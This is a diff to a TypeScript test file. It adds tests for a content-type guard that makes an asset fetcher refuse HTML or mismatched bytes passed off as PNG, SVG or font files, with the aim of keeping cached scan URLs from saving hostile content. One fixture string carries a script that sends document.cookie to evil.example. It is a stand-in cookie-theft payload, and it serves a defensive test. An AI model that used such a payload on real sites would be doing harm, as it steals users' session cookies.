@@ -129,14 +129,22 @@ describe("createLocalScanSource().scan", () => {
   });
 });
 
-const assetSource = (url: string): AssetSource => ({ url, proxy: "", format: "png" });
+const assetSource = (url: string, format: AssetSource["format"] = "png"): AssetSource => ({ url, proxy: "", format });
+
+/** Enough of a PNG for the magic numbers the type guard reads; the pixels never matter to `fetchBytes`. */
+const PNG = Buffer.concat([Buffer.from("\x89PNG\r\n\x1a\n", "latin1"), Buffer.from("pixels")]);
 
 /** A fetch in the shape `safeFetch` returns, with only the parts `fetchBytes` touches, counting what it was asked. */
-const fakeFetch = (status: number, body: string): SafeFetch & { calls: number; cancels: number } => {
+const fakeFetch = (status: number, body: Buffer | string, contentType = "image/png"): SafeFetch & { calls: number; cancels: number } => {
   const fetch = Object.assign(
     async () => {
       fetch.calls += 1;
-      return { status, buffer: async () => Buffer.from(body), cancel: async () => void (fetch.cancels += 1) } as unknown as SafeResponse;
+      return {
+        status,
+        headers: new Headers(contentType === "" ? {} : { "content-type": contentType }),
+        buffer: async () => (Buffer.isBuffer(body) ? body : Buffer.from(body)),
+        cancel: async () => void (fetch.cancels += 1),
+      } as unknown as SafeResponse;
     },
     { calls: 0, cancels: 0 },
   );
@@ -145,15 +153,15 @@ const fakeFetch = (status: number, body: string): SafeFetch & { calls: number; c
 
 describe("createLocalScanSource().fetchBytes", () => {
   it("reads inline bytes and a data URI without a request, and guards every other URL", async () => {
-    const fetch = fakeFetch(200, "remote");
+    const fetch = fakeFetch(200, PNG);
     const source = createLocalScanSource({ backend: fakeBackend([]), fetch });
 
     expect((await source.fetchBytes(testFontFile({ inline: { base64: "aGk=", mime: "font/woff2" } }))).toString()).toBe("hi");
-    expect((await source.fetchBytes(assetSource("data:text/plain,hi"))).toString()).toBe("hi");
+    expect((await source.fetchBytes(assetSource("data:image/svg+xml,%3Csvg%2F%3E", "svg"))).toString()).toBe("<svg/>");
     await expect(source.fetchBytes(assetSource(""))).rejects.toThrow(/no URL/);
     expect(fetch.calls).toBe(0);
 
-    expect((await source.fetchBytes(assetSource("https://cdn.example.com/a.png"))).toString()).toBe("remote");
+    expect(await source.fetchBytes(assetSource("https://cdn.example.com/a.png"))).toEqual(PNG);
     expect(fetch.calls).toBe(1);
   });
 
@@ -162,6 +170,44 @@ describe("createLocalScanSource().fetchBytes", () => {
     const source = createLocalScanSource({ backend: fakeBackend([]), fetch });
     await expect(source.fetchBytes(assetSource("https://cdn.example.com/a.png"))).rejects.toThrow(/HTTP 404/);
     expect(fetch.cancels).toBe(1);
+  });
+
+  /**
+   * The scan is a cache entry up to an hour old, so the URL of an asset can answer anything by the time a download
+   * reaches it. Nothing downstream looks at the bytes, so without this the answer was written as `images/hero.png` and
+   * recorded in the manifest as a PNG (review issues 1 and 19).
+   */
+  describe("the content type guard", () => {
+    const HTML = '<!doctype html><script>fetch("https://evil.example/?x=" + document.cookie)</script>';
+
+    it("refuses a declared type that is not an image or a font, before reading the body", async () => {
+      const fetch = fakeFetch(200, HTML, "text/html; charset=utf-8");
+      const source = createLocalScanSource({ backend: fakeBackend([]), fetch });
+
+      await expect(source.fetchBytes(assetSource("https://cdn.example.com/hero.png"))).rejects.toThrow(/text\/html.*not an image or a font/);
+      expect(fetch.cancels).toBe(1);
+    });
+
+    it("refuses bytes that are not the kind of file the scan reported, whatever they declared", async () => {
+      const lying = createLocalScanSource({ backend: fakeBackend([]), fetch: fakeFetch(200, HTML, "image/png") });
+      await expect(lying.fetchBytes(assetSource("https://cdn.example.com/hero.png"))).rejects.toThrow(/not a supported image or font/);
+
+      const untyped = createLocalScanSource({ backend: fakeBackend([]), fetch: fakeFetch(200, HTML, "application/octet-stream") });
+      await expect(untyped.fetchBytes(assetSource("https://cdn.example.com/hero.png"))).rejects.toThrow(/not a supported image or font/);
+
+      const raster = createLocalScanSource({ backend: fakeBackend([]), fetch: fakeFetch(200, PNG, "image/png") });
+      await expect(raster.fetchBytes(testFontFile({ url: "https://cdn.example.com/inter.woff2" }))).rejects.toThrow(
+        /image\/png, not the woff2 the scan reported/,
+      );
+      await expect(raster.fetchBytes(assetSource("https://cdn.example.com/logo.svg", "svg"))).rejects.toThrow(
+        /image\/png, not the svg the scan reported/,
+      );
+    });
+
+    it("refuses a data URI whose payload is not what it claims", async () => {
+      const source = createLocalScanSource({ backend: fakeBackend([]), fetch: fakeFetch(200, PNG) });
+      await expect(source.fetchBytes(assetSource("data:image/png;base64,PGh0bWw+", "png"))).rejects.toThrow(/not a supported image or font/);
+    });
   });
 });
 
